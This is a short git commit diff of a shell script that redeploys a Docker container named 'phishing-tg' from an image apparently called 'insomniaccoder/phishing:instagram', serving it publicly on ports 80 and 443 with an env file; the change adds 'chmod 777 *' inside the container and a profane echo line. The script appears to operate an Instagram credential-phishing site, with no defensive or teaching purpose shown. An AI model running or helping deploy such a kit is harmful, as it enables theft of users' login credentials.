b73b2513da1837575c3855292ba5578688b7e8f6
Harsh Singhvi <harshsinghvi98@gmail.com>
2020-06-29 12:13:02 +0530

    script post sync permissions

--- script.sh
+++ script.sh
@@ -1,4 +1,6 @@
 docker stop phishing-tg 
 docker rm phishing-tg 
+
 sudo docker run --env-file tg.env --name phishing-tg -d -p 80:80 -p 443:443 -v $PWD/src:/var/www/html/ insomniaccoder/phishing:instagram
-echo "Hello World !!"
+docker exec phishing-tg chmod 777 *
+echo "fucking container deployed  !!"
